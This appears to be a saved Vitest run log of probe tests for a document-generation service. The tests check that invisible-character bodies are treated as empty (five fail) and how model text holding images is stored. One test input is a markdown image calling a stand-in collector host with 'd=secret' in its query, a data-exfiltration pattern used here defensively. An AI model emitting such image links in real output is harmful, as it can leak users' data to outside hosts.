@@ -1,0 +1,197 @@
+ DEPRECATED  `test.poolOptions` was removed in Vitest 4. All previous `poolOptions` are now top-level options. Please, refer to the migration guide: https://vitest.dev/guide/migration#pool-rework
+
+ RUN  v4.1.7 <scratch>/review-figure
+
+stdout | generation.probe.test.ts > G1 a body with no words is stored as "" (the leaf resolver reports a gap) > zero-width space before the trailer
+{
+  "timestamp": "2026-10-04T17:54:49.614Z",
+  "level": "info",
+  "message": "[section-generation-service] Generated section draft",
+  "context": {
+    "documentId": 901,
+    "sectionCode": "2.3.P.8",
+    "organizationId": 7
+  }
+}
+
+stdout | generation.probe.test.ts > G1 a body with no words is stored as "" (the leaf resolver reports a gap) > zero-width space before the trailer
+G1 [zero-width space before the trailer] stored="<p>​</p>" resolverMaterializes=true leafBodyText="" exportBlocks=1 result.body="<p>​</p>"
+
+stdout | generation.probe.test.ts > G1 a body with no words is stored as "" (the leaf resolver reports a gap) > zero-width joiner
+{
+  "timestamp": "2026-10-04T17:54:49.628Z",
+  "level": "info",
+  "message": "[section-generation-service] Generated section draft",
+  "context": {
+    "documentId": 901,
+    "sectionCode": "2.3.P.8",
+    "organizationId": 7
+  }
+}
+
+stdout | generation.probe.test.ts > G1 a body with no words is stored as "" (the leaf resolver reports a gap) > zero-width joiner
+G1 [zero-width joiner] stored="<p>‍</p>" resolverMaterializes=true leafBodyText="" exportBlocks=1 result.body="<p>‍</p>"
+
+stdout | generation.probe.test.ts > G1 a body with no words is stored as "" (the leaf resolver reports a gap) > soft hyphen
+{
+  "timestamp": "2026-10-04T17:54:49.631Z",
+  "level": "info",
+  "message": "[section-generation-service] Generated section draft",
+  "context": {
+    "documentId": 901,
+    "sectionCode": "2.3.P.8",
+    "organizationId": 7
+  }
+}
+
+stdout | generation.probe.test.ts > G1 a body with no words is stored as "" (the leaf resolver reports a gap) > soft hyphen
+G1 [soft hyphen] stored="<p>­</p>" resolverMaterializes=true leafBodyText="­" exportBlocks=1 result.body="<p>­</p>"
+
+stdout | generation.probe.test.ts > G1 a body with no words is stored as "" (the leaf resolver reports a gap) > word joiner
+{
+  "timestamp": "2026-10-04T17:54:49.636Z",
+  "level": "info",
+  "message": "[section-generation-service] Generated section draft",
+  "context": {
+    "documentId": 901,
+    "sectionCode": "2.3.P.8",
+    "organizationId": 7
+  }
+}
+
+stdout | generation.probe.test.ts > G1 a body with no words is stored as "" (the leaf resolver reports a gap) > word joiner
+G1 [word joiner] stored="<p>⁠</p>" resolverMaterializes=true leafBodyText="?" exportBlocks=1 result.body="<p>⁠</p>"
+
+stdout | generation.probe.test.ts > G1 a body with no words is stored as "" (the leaf resolver reports a gap) > empty markdown emphasis
+{
+  "timestamp": "2026-10-04T17:54:49.638Z",
+  "level": "info",
+  "message": "[section-generation-service] Generated section draft",
+  "context": {
+    "documentId": 901,
+    "sectionCode": "2.3.P.8",
+    "organizationId": 7
+  }
+}
+
+stdout | generation.probe.test.ts > G1 a body with no words is stored as "" (the leaf resolver reports a gap) > empty markdown emphasis
+G1 [empty markdown emphasis] stored="<p>****</p>" resolverMaterializes=true leafBodyText="****" exportBlocks=1 result.body="<p>****</p>"
+
+stdout | generation.probe.test.ts > G2 model text that names an image > a markdown image is stored as text; what the leaf and export print
+{
+  "timestamp": "2026-10-04T17:54:49.641Z",
+  "level": "info",
+  "message": "[section-generation-service] Generated section draft",
+  "context": {
+    "documentId": 901,
+    "sectionCode": "2.3.P.8",
+    "organizationId": 7
+  }
+}
+
+stdout | generation.probe.test.ts > G2 model text that names an image > a markdown image is stored as text; what the leaf and export print
+G2 stored="<p>The chromatogram is shown below.</p><p>![Figure 1](https://collector.example/p.png?d=secret)</p>"
+G2 leaf="The chromatogram is shown below.\n\n![Figure 1](https://collector.example/p.png?d=secret)"
+G2 export="The chromatogram is shown below.\n![Figure 1](https://collector.example/p.png?d=secret)"
+
+stdout | generation.probe.test.ts > G2 model text that names an image > an HTML-entity spelled tag stays text
+{
+  "timestamp": "2026-10-04T17:54:49.644Z",
+  "level": "info",
+  "message": "[section-generation-service] Generated section draft",
+  "context": {
+    "documentId": 901,
+    "sectionCode": "2.3.P.8",
+    "organizationId": 7
+  }
+}
+
+stdout | generation.probe.test.ts > G2 model text that names an image > an HTML-entity spelled tag stays text
+G2b stored="<p>A &amp;lt;img src=x&amp;gt; and &amp;#60;img src=y&amp;#62; written as text.</p>" leaf="A &lt;img src=x&gt; and &#60;img src=y&#62; written as text."
+
+ × generation.probe.test.ts > G1 a body with no words is stored as "" (the leaf resolver reports a gap) > zero-width space before the trailer 17ms
+   → expected '<p>​</p>' to be '' // Object.is equality
+ × generation.probe.test.ts > G1 a body with no words is stored as "" (the leaf resolver reports a gap) > zero-width joiner 3ms
+   → expected '<p>\u200d</p>' to be '' // Object.is equality
+ × generation.probe.test.ts > G1 a body with no words is stored as "" (the leaf resolver reports a gap) > soft hyphen 5ms
+   → expected '<p>\u00ad</p>' to be '' // Object.is equality
+ × generation.probe.test.ts > G1 a body with no words is stored as "" (the leaf resolver reports a gap) > word joiner 2ms
+   → expected '<p>\u2060</p>' to be '' // Object.is equality
+ × generation.probe.test.ts > G1 a body with no words is stored as "" (the leaf resolver reports a gap) > empty markdown emphasis 3ms
+   → expected '<p>****</p>' to be '' // Object.is equality
+ ✓ generation.probe.test.ts > G2 model text that names an image > a markdown image is stored as text; what the leaf and export print 1ms
+ ✓ generation.probe.test.ts > G2 model text that names an image > an HTML-entity spelled tag stays text 2ms
+
+⎯⎯⎯⎯⎯⎯⎯ Failed Tests 5 ⎯⎯⎯⎯⎯⎯⎯
+
+ FAIL  generation.probe.test.ts > G1 a body with no words is stored as "" (the leaf resolver reports a gap) > zero-width space before the trailer
+AssertionError: expected '<p>​</p>' to be '' // Object.is equality
+
+- Expected
++ Received
+
++ <p>​</p>
+
+ ❯ generation.probe.test.ts:63:20
+
+
+⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[1/5]⎯
+
+ FAIL  generation.probe.test.ts > G1 a body with no words is stored as "" (the leaf resolver reports a gap) > zero-width joiner
+AssertionError: expected '<p>\u200d</p>' to be '' // Object.is equality
+
+- Expected
++ Received
+
++ <p>‍</p>
+
+ ❯ generation.probe.test.ts:63:20
+
+
+⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[2/5]⎯
+
+ FAIL  generation.probe.test.ts > G1 a body with no words is stored as "" (the leaf resolver reports a gap) > soft hyphen
+AssertionError: expected '<p>\u00ad</p>' to be '' // Object.is equality
+
+- Expected
++ Received
+
++ <p>­</p>
+
+ ❯ generation.probe.test.ts:63:20
+
+
+⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[3/5]⎯
+
+ FAIL  generation.probe.test.ts > G1 a body with no words is stored as "" (the leaf resolver reports a gap) > word joiner
+AssertionError: expected '<p>\u2060</p>' to be '' // Object.is equality
+
+- Expected
++ Received
+
++ <p>⁠</p>
+
+ ❯ generation.probe.test.ts:63:20
+
+
+⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[4/5]⎯
+
+ FAIL  generation.probe.test.ts > G1 a body with no words is stored as "" (the leaf resolver reports a gap) > empty markdown emphasis
+AssertionError: expected '<p>****</p>' to be '' // Object.is equality
+
+- Expected
++ Received
+
++ <p>****</p>
+
+ ❯ generation.probe.test.ts:63:20
+
+
+⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[5/5]⎯
+
+
+ Test Files  1 failed (1)
+      Tests  5 failed | 2 passed (7)
+   Start at  17:54:47
+   Duration  2.65s (transform 895ms, setup 99ms, import 2.30s, tests 38ms, environment 0ms)
+
